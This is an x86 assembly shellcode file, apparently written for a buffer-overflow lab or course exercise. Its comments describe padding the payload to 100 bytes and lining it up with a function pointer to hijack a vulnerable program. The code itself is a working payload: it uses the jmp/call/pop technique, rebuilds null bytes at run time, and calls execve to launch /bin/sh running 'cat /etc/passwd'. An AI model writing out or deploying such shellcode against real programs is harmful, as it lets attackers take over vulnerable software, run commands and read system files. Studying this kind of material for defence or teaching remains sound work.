bits 32
; 2 NOP instructions - this makes it so that the assembly exploit is  100 bytes
; here we align it with the function pointer 
nop 
nop
;we needed 100 * characters to segmentation fault 

start: jmp short codeEnd
start2: pop esi

; clear the A register
xor eax, eax

; restore null bytes in data
mov [byte esi+flagStr-exeStr-2], al ; subtract 2 in order to point to X char instead of y char - moving null byte to end of bin
mov [byte esi+cmdStr-exeStr-1], al ; moving the null byte to the end of -c
mov [byte esi+arrayAddr-exeStr-1], al ; moving the null byte to the end of the shell command
mov [byte esi+arrayAddr-exeStr+12], eax ; moving to the end of the array


mov [byte esi+arrayAddr-exeStr], esi ; The address of exeStr is in esi


; fetch address of flagStr
lea edi, [byte esi+flagStr-exeStr]
mov [byte esi+arrayAddr-exeStr+4], edi

; retrieve address of cmdStr
lea edi, [byte esi+cmdStr-exeStr]
mov [byte esi+arrayAddr-exeStr+8], edi

; setup registers and make system call.
mov al, 0x0b
mov ebx, esi ; use runtime address of exeStr
lea ecx, [byte esi+arrayAddr-exeStr] ; use runtime address of array address
xor edx, edx ; set edx to 0
int 0x80
codeEnd: call start2

; data
exeStr: db "/bin/shXy" 
flagStr: db "-cX"
cmdStr: db "cat /etc/passwd;exitX"

arrayAddr:
dd 0xffffffff
dd 0xffffffff
dd 0xffffffff
dd 0xffffffff
newAddr: dd newAddr-start